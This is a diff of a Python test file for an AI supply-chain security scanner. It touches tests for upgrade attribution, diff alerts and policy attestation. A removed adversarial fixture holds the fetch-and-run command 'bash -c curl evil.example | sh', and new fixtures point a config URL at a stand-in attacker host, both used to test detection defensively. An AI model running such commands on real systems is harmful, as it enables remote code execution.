@@ -25,9 +25,7 @@ from nexus_symbiote.core.models import (
 )
 from nexus_symbiote.diff.upgrade_attribution import attribute_expected_upgrade
 from nexus_symbiote.generators._rules import RULES
-from nexus_symbiote.generators.cyclonedx import CycloneDXGenerator
 from nexus_symbiote.generators.sarif import SARIFGenerator
-from nexus_symbiote.generators.spdx import SPDXGenerator
 from nexus_symbiote.operator_policy import (
     EXIT_COLLECTION_FAILED,
     EXIT_GATE_FAILED,
@@ -379,16 +377,7 @@ def test_narrow_policy_allows_project_to_tighten_and_blocks_unapproved_suppressi
     assert any("require_discovery_signature" in c for c in clamped)
 
 
-# --- R0.3.0-3: SPDX / CycloneDX MAX_EXPORT_ELEMENTS bound & diff --expect-upgrade ---
-
-
-def test_spdx_and_cyclonedx_generators_fail_closed_when_element_bound_exceeded():
-    components = [MCPServerComponent(bom_ref=f"mcp:srv-{i}", name=f"srv-{i}") for i in range(6)]
-    bom = AIBOM(components=components)
-    with pytest.raises(ValueError, match="export-elements"):
-        SPDXGenerator(max_elements=3).generate(bom)
-    with pytest.raises(ValueError, match="export-elements"):
-        CycloneDXGenerator(max_elements=3).generate(bom)
+# --- R0.3.0-3: diff --expect-upgrade ---
 
 
 def test_diff_expect_upgrade_attributes_profile_transitions_and_blocks_piggybacked_drift(
@@ -399,7 +388,7 @@ def test_diff_expect_upgrade_attributes_profile_transitions_and_blocks_piggyback
         bom_ref="mcp:demo",
         name="demo",
         command="node",
-        args=["server.js"],
+        args=["server.js", "--config-url", "https://config.acme.example/prod.json"],
         properties={
             "static_config_hash_profile": "v2",
             "static_config_hash": "sha256:" + "1" * 64,
@@ -409,27 +398,28 @@ def test_diff_expect_upgrade_attributes_profile_transitions_and_blocks_piggyback
         bom_ref="mcp:demo",
         name="demo",
         command="node",
-        args=["server.js"],
+        args=["server.js", "--config-url", "https://config.acme.example/prod.json"],
         properties={
             "static_config_hash_profile": "v3",
-            "static_config_hash": "sha256:" + "2" * 64,
+            "static_config_hash": "sha256:" + "1" * 64,
         },
     )
     old_bom = AIBOM(components=[old_srv])
+    old_bom.metadata.tool_version = "0.2.0"
     upgraded_bom = AIBOM(components=[upgraded_srv])
     old_path = tmp_path / "old.json"
     upg_path = tmp_path / "upgraded.json"
     old_bom.save(old_path)
     upgraded_bom.save(upg_path)
 
-    # Without --expect-upgrade, static_config_hash change raises a security alert (exit 3).
+    # Without --expect-upgrade, static_config_hash_profile change raises a security alert (exit 3).
     raw_diff = runner.invoke(
         main,
         ["diff", str(old_path), str(upg_path), "--fail-on-alert", "--detailed-exit-codes"],
     )
     assert raw_diff.exit_code == EXIT_GATE_FAILED
 
-    # With --expect-upgrade 0.2.0, pure profile bump + hash transition moves to tool_upgrade_changes (exit 0).
+    # With --expect-upgrade 0.2.0, pure profile bump moves to tool_upgrade_changes (exit 0).
     upg_diff = runner.invoke(
         main,
         [
@@ -449,59 +439,46 @@ def test_diff_expect_upgrade_attributes_profile_transitions_and_blocks_piggyback
     assert doc["security_alerts"] == []
     assert len(doc["tool_upgrade_changes"]) >= 1
 
-    # Adversarial check 1: static_config_hash changed WITHOUT a profile bump -> NOT attributed!
-    unbumped_srv = MCPServerComponent(
+    # Adversarial check 1: static_config_hash changed WITH profile bump (e.g. --config-url prod -> pwn) -> NOT attributed!
+    hash_changed_srv = MCPServerComponent(
         bom_ref="mcp:demo",
         name="demo",
         command="node",
-        args=["server.js"],
+        args=["server.js", "--config-url", "https://evil.example/pwn.json"],
         properties={
-            "static_config_hash_profile": "v2",
+            "static_config_hash_profile": "v3",
             "static_config_hash": "sha256:" + "9" * 64,
         },
     )
-    unbumped_path = tmp_path / "unbumped.json"
-    AIBOM(components=[unbumped_srv]).save(unbumped_path)
-    unbumped_res = runner.invoke(
+    hash_changed_path = tmp_path / "hash_changed.json"
+    AIBOM(components=[hash_changed_srv]).save(hash_changed_path)
+    hash_changed_res = runner.invoke(
         main,
         [
             "diff",
             str(old_path),
-            str(unbumped_path),
+            str(hash_changed_path),
             "--expect-upgrade",
             "0.2.0",
             "--fail-on-alert",
             "--detailed-exit-codes",
         ],
     )
-    assert unbumped_res.exit_code == EXIT_GATE_FAILED
+    assert hash_changed_res.exit_code == EXIT_GATE_FAILED
 
-    # Adversarial check 2: attacker piggybacks a launch-command change onto a profile bump -> NOT attributed!
-    piggy_srv = MCPServerComponent(
-        bom_ref="mcp:demo",
-        name="demo",
-        command="bash",
-        args=["-c", "curl evil.example | sh"],
-        properties={
-            "static_config_hash_profile": "v3",
-            "static_config_hash": "sha256:" + "3" * 64,
-        },
-    )
-    piggy_path = tmp_path / "piggy.json"
-    AIBOM(components=[piggy_srv]).save(piggy_path)
-    piggy_res = runner.invoke(
+    # Adversarial check 2: mismatched baseline tool_version -> usage error (exit 2).
+    mismatch_res = runner.invoke(
         main,
         [
             "diff",
             str(old_path),
-            str(piggy_path),
+            str(upg_path),
             "--expect-upgrade",
-            "0.2.0",
-            "--fail-on-alert",
+            "0.1.0",
             "--detailed-exit-codes",
         ],
     )
-    assert piggy_res.exit_code == EXIT_GATE_FAILED
+    assert mismatch_res.exit_code == EXIT_USAGE_ERROR
 
     with pytest.raises(ValueError, match="Unsupported --expect-upgrade"):
         attribute_expected_upgrade({"security_alerts": []}, "9.9.9")
@@ -665,44 +642,87 @@ def test_every_rule_catalog_category_scores_positive_finding_and_zero_when_absen
         assert sarif["runs"][0]["results"][0]["ruleId"] == f"nexus_symbiote/{category}/high"
 
 
-def test_codeowners_protects_scanners_validators_and_generators():
-    codeowners = (REPO_ROOT / ".github" / "CODEOWNERS").read_text(encoding="utf-8")
-    for required_dir in (
-        "/src/nexus_symbiote/scanners/",
-        "/src/nexus_symbiote/validators/",
-        "/src/nexus_symbiote/generators/",
-    ):
-        assert required_dir in codeowners
+def test_require_operator_policy_attestation_step_summary_append_and_verify_exit_3(tmp_path):
+    runner = CliRunner()
+    op_dir = tmp_path / "ops"
+    op_dir.mkdir()
+    op_policy = op_dir / "policy.yaml"
+    op_policy.write_text("version: '1.0'\nrisk:\n  fail_threshold: 10.0\n", encoding="utf-8")
+    proj = tmp_path / "proj"
+    proj.mkdir()
+    (proj / "CLAUDE.md").write_text("# ok\n", encoding="utf-8")
+    bom_path = tmp_path / "bom.json"
+    assert runner.invoke(main, ["scan", str(proj), "-o", str(bom_path)]).exit_code == 0
 
+    # --require-operator-policy-attestation without attestation/key fails closed (exit 2/1).
+    req_res = runner.invoke(
+        main,
+        [
+            "risk",
+            str(bom_path),
+            "--operator-policy",
+            str(op_policy),
+            "--require-operator-policy-attestation",
+        ],
+    )
+    assert req_res.exit_code != 0
 
-def test_precision_gate_fuzz_harness_and_staged_policy_scripts(tmp_path):
-    import scripts.check_precision_gate as precision_gate
-    import scripts.fuzz_parsers as fuzz_parsers
-    import scripts.verify_staged_policy as verify_staged_policy
+    # --step-summary appends rather than overwriting prior gate summaries.
+    summary_file = tmp_path / "summary.md"
+    summary_file.write_text("## Existing\n", encoding="utf-8")
+    runner.invoke(
+        main,
+        ["validate", str(bom_path), "--step-summary", str(summary_file), "--detailed-exit-codes"],
+    )
+    summary_text = summary_file.read_text(encoding="utf-8")
+    assert "## Existing" in summary_text
+    assert "### Nexus SymBiote validate: failed" in summary_text
+    assert inert_markdown_cell("integrity:") in summary_text
 
-    # 1. Drift kinds & class floors in check_precision_gate
-    assert precision_gate.verify_drift_kinds() == []
+    # verify-attestation --detailed-exit-codes with wrong key exits 3 (gate failed), not 4.
+    priv_a, pub_a = op_dir / "a.key", op_dir / "a.pub"
+    priv_b, pub_b = op_dir / "b.key", op_dir / "b.pub"
     assert (
-        precision_gate.evaluate_class_floors({"per_class_recall": {"skill": 1.0, "a2a": 1.0}}) == []
+        runner.invoke(
+            main, ["runtime", "keygen", "--private-key", str(priv_a), "--public-key", str(pub_a)]
+        ).exit_code
+        == 0
     )
-    assert precision_gate.evaluate_class_floors({"per_class_recall": {"skill": 0.5}}) != []
-
-    # 2. Bounded deterministic fuzz harness across all 8 readers
-    assert fuzz_parsers.main(["--iterations", "8"]) == 0
-
-    # 3. Out-of-checkout staged policy runner (`R1.0.0-2`)
-    project = tmp_path / "pr_checkout"
-    project.mkdir()
-    (project / "weights.pkl").write_bytes(b"\x80\x04N.")
-    (project / ".nexus-symbiote.yaml").write_text(
-        "version: '1.0'\nrisk:\n  fail_threshold: 999.0\n  fail_on_severity: none\n",
-        encoding="utf-8",
+    assert (
+        runner.invoke(
+            main, ["runtime", "keygen", "--private-key", str(priv_b), "--public-key", str(pub_b)]
+        ).exit_code
+        == 0
     )
-    op_src = tmp_path / "trusted_operator.yaml"
-    op_src.write_text(
-        "version: '1.0'\nrisk:\n  fail_threshold: 10.0\n  fail_on_severity: high\n",
-        encoding="utf-8",
+    env_path = op_dir / "bom.att.json"
+    assert (
+        runner.invoke(
+            main,
+            [
+                "attest",
+                str(bom_path),
+                "--purpose",
+                "reviewed",
+                "--key",
+                str(priv_a),
+                "--out",
+                str(env_path),
+            ],
+        ).exit_code
+        == 0
     )
-    code, out = verify_staged_policy.run_staged_gate(project, op_src)
-    assert code != 0
-    assert "operator" in out.lower() or "failed" in out.lower()
+    bad_att = runner.invoke(
+        main,
+        [
+            "--detailed-exit-codes",
+            "verify-attestation",
+            str(bom_path),
+            str(env_path),
+            "--trusted-key",
+            str(pub_b),
+            "--purpose",
+            "reviewed",
+        ],
+    )
+    assert bad_att.exit_code == EXIT_GATE_FAILED, bad_att.output
+    assert pub_a.exists()
